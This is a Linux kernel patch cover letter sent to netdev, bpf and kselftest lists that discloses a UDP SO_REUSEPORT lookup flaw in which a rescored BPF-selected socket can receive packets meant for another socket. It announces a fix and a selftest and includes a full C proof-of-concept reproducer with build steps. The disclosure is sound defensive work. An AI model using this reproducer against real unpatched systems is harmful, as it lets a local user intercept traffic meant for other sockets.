Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.210.179
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1794801342;
	b=xZWoH0uN1jeF5mGtjRydH2k6Km4LCrm9hD/hcpeovA4IlJBZhR4iRmvCSa3scJnbpOHB
	 mxbv0BQS6GS+nj3Zgb01408HysKu/ZizS1kafo5nKSsRsWEGFy2zC07+s6/Pg/CRM9w3+
	 ibBJbhk0gocgvMG7LTC3/NqxPz1sT4R3f/Ppt0fJgO1fnNZPB8htg2FI9Fssdp0W7wVcX
	 qriKgdI/0IjmS9Ea2RdgnqS1yCoUWgAn+6OgxYeF650LLe0mCQ5TDozfvmRIqGQPGJsV3
	 83d6amP2NIOjrkm11AuaSHsn8rggSqq0OMhtC4HF81lIkJWuAmmg2NqFvGg+SqKx5rA==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794801342;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
	 Content-Transfer-Encoding;
	bh=9wWDUeHs8WtZ7McCq+nlaSEn0hry6GIpnXnMqtzPrKM=;
	b=PfucnwirWqJeWyEEdwbP5emup6RgwSkt1KD9EtCg1i7CyPBKSTKtzNWyVNbPOcivNzFL
	 9ljcIrGBANx8Cdg28uHADgC6CmNZCuJ/1WJAMqrZaY6qFEZzwqXNjg6m0ItdAZdUosSvc
	 kqP1zGm3lViXbE63gTfcivve5j+hsMj+38qjBW2KUoE1H9NgQQQQxf2K4nqB9cJ8CkzNF
	 d6rZ/2cumdB13pZ31BbEJqjRK6D2FTLj3zO+whAlLjmTwTVNTCDG4LsWHThyLhO+WIBZf
	 0GJJaDLuc/zxypFqKGQUUpTwz9r9ANVyFs6M5tjDs8eZ7ebIE83OnkWDJGWKD/ccklw==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=ie0kkSue;
	arc=none smtp.remote-ip=209.85.210.179
Received: from mail-pf1-f179.google.com (mail-pf1-f179.google.com [209.85.210.179])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E101F606A321
	for <bpf@vger.kernel.org>; Mon, 16 Nov 2026 03:55:41 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org E101F606A321
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=ie0kkSue
Received: by mail-pf1-f179.google.com with SMTP id d2e1a72fcca58-8a0673d9bd2so2401868b3a.3
        for <bpf@vger.kernel.org>; Sun, 15 Nov 2026 19:55:41 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1794801341; x=1795406141; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=9wWDUeHs8WtZ7McCq+nlaSEn0hry6GIpnXnMqtzPrKM=;
        b=ie0kkSue83AikMvDY7FSOEkyoNdRRGGwBG+QWGB+rRbeTjWObsWCFG3ucfE/SLjHSF
         OzrMS3wqi1jCKXDvcxSqvGQyF96Hyj1N26O9DDdPagsS0rwBFT7EhSBEyCQbuFCoUUe5
         /K9z7UuUVShQiEBeA1FYNgBAIQdbc3YvOljcw7TS/MGT+WB4agus1VT7QEkEF2mvjAR4
         py9vLpgyJIA6lxUh1Z4BDr0Y0GLQ8jPBv+h4Gce6y8shRA516pPF6Mxx6yGs26Ud79/o
         30Kd2A/UPhFkd+bThOgDO0tvQvVpPaGzpq6msx95fko6SBvm+m9Zl4TAhz69IKdZMmwP
         DvmQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1794801341; x=1795406141;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=9wWDUeHs8WtZ7McCq+nlaSEn0hry6GIpnXnMqtzPrKM=;
        b=nCsT2y1HRb+CdkLphUmCMreu7AAedY8lRtbkVi2V0WO0aQ5yG6OFtmIVh7jvEq+vMi
         8sC+Nzh9kE/Kn8u2U+u7A0a36IjUa+Wfq41r/qxtKVDVOFLzhhMGOwvV/VxIV2zDSNoo
         Ih8jzbS4b9e7OKBcxA2gcundVbtyCzNSPHGn3UUwisIAbSP1nT5E0YwXrVI3LfalqCqW
         38xnkdqROv+Buxo7O6ZnvI8VNQ3Q9Dr8J652/1a4iHylxUkz8/unCMWqG6yjzv5BQGIQ
         /1NlS4uG82vdpugh1E2jfLd94svpVoeELODd/6sDcqVby/SOkyd8Ub8t2FiwbHdSONEK
         +LdQ==
X-Forwarded-Encrypted: i=1; AL+hErFUvWhBgsr+qrOCSmwcaxsdvfgvDCTLqJN17j/ZFRw6/a4qPiRa63Ww3nvp08E0Y70SXtw=@vger.kernel.org
X-Gm-Message-State: APuU4Z9coB7pt73HWhz82MNA2Hhx5DirQk+2vrKRvp5/UopHPx9m1V+z
	jsUxwxmYuk9SgRIE+z9eG0caDk33z+Jwex75UR1aD1us3c9DtaXzkwUpaKr3NrWhdfGL
X-Gm-Gg: AYBFou0VGID8oc2wxdT0ukLJDBveJBeSR0lLitwcjkGTxoBha+VMalzbIu+MAA1TqQD
	jgH6aAdMga30u6SKJwF9gljN7RMzjy+qgyxZ5YHlBbWKgPCE2x2lMzCrKpiUP3IYQjYDeauvw6e
	SHnVgKzo/zvZI43OnZwCZMpyhHeqcaYDdhrXxpPTlDP4OtA0U+o9cE8BfT9u3bzWG4G8J/117ru
	MLJ9F8a0nzROkAvGEUEc5zEOA43IaG/qv8NuWCJbX8G4xzU3zBHb1nN8mR+neIMi4rhSuQx7Vo9
	UEjPVIN5N2rp0R5vKX212K65z5dgj0CCoJlenCl8RXAXDVrwGM/V1s1oim0JFUnZFzslorIiZcz
	GtEO0GaiHOTQZ8/jzE8gbxefacDit5c+Qwwd0jGRVAT0MMnKqnBJ+gW2DWkkbFoDRZLOzawtJfz
	dePjwVt9kYp+fKkDgoEbXU3oo83FqPQ1cqj7hKmrRafeOhjHCjrxKjIK68ZI7skvc63BymHsd4a
	+dhXImtCFgOTA0KY1BEOgFaid8AAd5CYmFAnCZtcI6U1eiWCU+avLkd/8wiWbAG2acZR+auAFgp
	YaeeGwXyHzkOAIOmdq6mXkagCVKpO77oamunSofYpdxgRsoALbGKAIJJoPpcRxUQmIUyr7PMJ48
	bUS6/nuOF3PTy9GsNhe01
X-Received: by 2002:a05:6a21:4506:b0:3de:463c:7fce with SMTP id adf61e73a8af0-3f7a68a51bemr8923750637.12.1794801341039;
        Sun, 15 Nov 2026 19:55:41 -0800 (PST)
Received: from 24c857d0c3be.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cddc1886b12sm3463176a12.11.2026.11.15.19.55.36
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 15 Nov 2026 19:55:39 -0800 (PST)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org,
	linux-kselftest@vger.kernel.org,
	bpf@vger.kernel.org
Cc: willemdebruijn.kernel@gmail.com,
	davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	benh@amazon.com,
	kuniyu@google.com,
	shuah@kernel.org,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net 0/2] udp: fix connected reuseport rescore fallback
Date: Mon, 16 Nov 2026 03:55:31 +0000
Message-ID: <cover.1794759652.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Post: <mailto:bpf@vger.kernel.org>
List-Help: <mailto:bpf+help@vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
List-Owner: <mailto:bpf+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found a UDP socket misdelivery issue in the IPv4 and IPv6 reuseport
lookup paths, in net/ipv4/udp.c and net/ipv6/udp.c. The issue affects
local users able to create SO_REUSEPORT sockets and attach a classic
reuseport BPF selector; no capability or namespace setup is required by
the trigger itself.

---- details below ----

An LLM was used to help create this patch.

This bug is tracked at:
https://bugtracker.nebusec.ai/f/net/ipv6/udp.c||udp6_lib_lookup2||socket-hijack||m7q
(net/ipv6/udp.c||udp6_lib_lookup2||socket-hijack||m7q)

Bug details:

When a SO_REUSEPORT group contains connected sockets, udp*_lib_lookup2()
rescored the socket selected by the reuseport program. If the selected
socket did not match the packet, the failed score was ignored and the
stale socket remained as the lookup result. The packet could then be
delivered to a socket connected to a different peer.

The fix retains the BPF-selected socket only when its rescore is better
than the current candidate; otherwise it restores the candidate that
established the current score. The same correction is applied to IPv4
and IPv6. The unconnected/no-connected-group fast path is unchanged, and
a selected connected socket that matches the packet still wins.

Reproducer:

Save the PoC below as `poc.c`, then build and run it on a pre-fix kernel:

    gcc -O2 -Wall -Wextra -o poc poc.c
    ./poc

The reproducer uses loopback UDP sockets, a connected SO_REUSEPORT member,
and a classic BPF selector fixed to socket index 1. Packetdrill is not a
suitable harness for this case because the trigger depends on creating and
connecting sockets and installing a `SO_ATTACH_REUSEPORT_CBPF` program;
it does not depend on a special wire-level packet sequence. The source is
included below.

The same mismatch and positive-match cases are covered by the new
`test_connected_reuseport_rescore()` selftest in patch 2. The selftest
harness creates a network namespace, so run it as root:

    make -C tools/testing/selftests/net
    tools/testing/selftests/net/reuseport_bpf

The selftest ran in a 2 vCPU, 2 GB x86-64 QEMU guest. Its test harness
creates a network namespace and was run as root there; the standalone
trigger itself was also exercised as an unprivileged user. On the pre-fix
kernel, the IPv4 and IPv6 mismatch probes both failed at the unexpected
socket assertion. On the fixed kernel, the full selftest exited 0 and
printed SUCCESS; the standalone PoC did not reproduce misdelivery in four
unprivileged guest runs.

------BEGIN PoC------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/filter.h>
#include <netinet/in.h>
#include <poll.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef SO_ATTACH_REUSEPORT_CBPF
#define SO_ATTACH_REUSEPORT_CBPF 51
#endif

#define PAYLOAD "udp6-lib-lookup2-stale-result"
#define CONNECTED_PEER_PORT 40000
#define TEST_SPORT 12345

static void die(const char *what)
{
	perror(what);
	exit(1);
}

static void set_reuseport(int fd)
{
	int one = 1;

	if (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &one, sizeof(one)) < 0)
		die("setsockopt(SO_REUSEPORT)");
}

static int make_udp6_socket(void)
{
	int fd = socket(AF_INET6, SOCK_DGRAM, 0);

	if (fd < 0)
		die("socket(AF_INET6)");
	return fd;
}

static void bind_udp6(int fd, const struct in6_addr *addr, uint16_t port)
{
	struct sockaddr_in6 sa = {
		.sin6_family = AF_INET6,
		.sin6_port = htons(port),
		.sin6_addr = *addr,
	};

	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("bind(AF_INET6)");
}

static uint16_t get_bound_port(int fd)
{
	struct sockaddr_in6 sa;
	socklen_t salen = sizeof(sa);

	memset(&sa, 0, sizeof(sa));
	if (getsockname(fd, (struct sockaddr *)&sa, &salen) < 0)
		die("getsockname");
	return ntohs(sa.sin6_port);
}

static void connect_udp6(int fd, const struct in6_addr *addr, uint16_t port)
{
	struct sockaddr_in6 sa = {
		.sin6_family = AF_INET6,
		.sin6_port = htons(port),
		.sin6_addr = *addr,
	};

	if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("connect(AF_INET6)");
}

static void attach_constant_reuseport_cbpf(int fd, unsigned int index)
{
	struct sock_filter filter[] = {
		BPF_STMT(BPF_RET | BPF_K, index),
	};
	struct sock_fprog prog = {
		.len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
		.filter = filter,
	};

	if (setsockopt(fd, SOL_SOCKET, SO_ATTACH_REUSEPORT_CBPF,
		       &prog, sizeof(prog)) < 0)
		die("setsockopt(SO_ATTACH_REUSEPORT_CBPF)");
}

static void pin_cpu0(void)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(0, &set);
	if (sched_setaffinity(0, sizeof(set), &set) < 0)
		die("sched_setaffinity");
}

static bool recv_one(int fd, const char *name, uint16_t *sport_out)
{
	char buf[256];
	struct sockaddr_in6 peer;
	struct msghdr msg;
	struct iovec iov;
	ssize_t n;
	socklen_t salen = sizeof(peer);

	memset(&peer, 0, sizeof(peer));
	memset(&msg, 0, sizeof(msg));
	iov.iov_base = buf;
	iov.iov_len = sizeof(buf);
	msg.msg_name = &peer;
	msg.msg_namelen = salen;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	n = recvmsg(fd, &msg, MSG_DONTWAIT);
	if (n < 0) {
		if (errno == EAGAIN || errno == EWOULDBLOCK)
			return false;
		die("recvmsg");
	}

	*sport_out = ntohs(peer.sin6_port);
	printf("%s received %zd bytes from sport=%u\n", name, n, *sport_out);
	return true;
}

int main(void)
{
	const struct in6_addr loop = IN6ADDR_LOOPBACK_INIT;
	struct sockaddr_in6 dst = {
		.sin6_family = AF_INET6,
		.sin6_port = 0,
		.sin6_addr = IN6ADDR_LOOPBACK_INIT,
	};
	const char payload[] = PAYLOAD;
	struct pollfd pfds[2];
	uint16_t dport;
	uint16_t bad_sport = 0;
	uint16_t good_sport = 0;
	ssize_t n;
	int good_fd;
	int bad_fd;
	int send_fd;

	pin_cpu0();

	good_fd = make_udp6_socket();
	set_reuseport(good_fd);
	bind_udp6(good_fd, &loop, 0);
	dport = get_bound_port(good_fd);

	bad_fd = make_udp6_socket();
	set_reuseport(bad_fd);
	bind_udp6(bad_fd, &loop, dport);
	connect_udp6(bad_fd, &loop, CONNECTED_PEER_PORT);

	attach_constant_reuseport_cbpf(good_fd, 1);

	send_fd = make_udp6_socket();
	bind_udp6(send_fd, &loop, TEST_SPORT);
	dst.sin6_port = htons(dport);

	printf("group port=%u, connected peer port=%u, sender sport=%u\n",
	       dport, CONNECTED_PEER_PORT, TEST_SPORT);

	n = sendto(send_fd, payload, sizeof(payload), 0,
		   (struct sockaddr *)&dst, sizeof(dst));
	if (n < 0)
		die("sendto");

	pfds[0].fd = good_fd;
	pfds[0].events = POLLIN;
	pfds[1].fd = bad_fd;
	pfds[1].events = POLLIN;

	if (poll(pfds, 2, 1000) < 0)
		die("poll");

	(void)recv_one(good_fd, "good", &good_sport);
	(void)recv_one(bad_fd, "bad-connected", &bad_sport);

	if (bad_sport == TEST_SPORT && good_sport == 0) {
		printf("BUG: packet from sport=%u was delivered to the socket connected to %u\n",
		       bad_sport, CONNECTED_PEER_PORT);
		return 0;
	}

	fprintf(stderr, "PoC did not observe the stale-result misdelivery\n");
	return 2;
}

------END PoC--------

This is a logic issue and does not crash the kernel; no crash log is
available.

Best regards,
Zihan Xi

Zihan Xi (2):
  udp: fix reuseport rescore fallback
  selftests: net: cover connected UDP reuseport rescore

 net/ipv4/udp.c                              |  11 +-
 net/ipv6/udp.c                              |  11 +-
 tools/testing/selftests/net/reuseport_bpf.c | 150 ++++++++++++++++++++
 3 files changed, 166 insertions(+), 6 deletions(-)

-- 
2.43.0

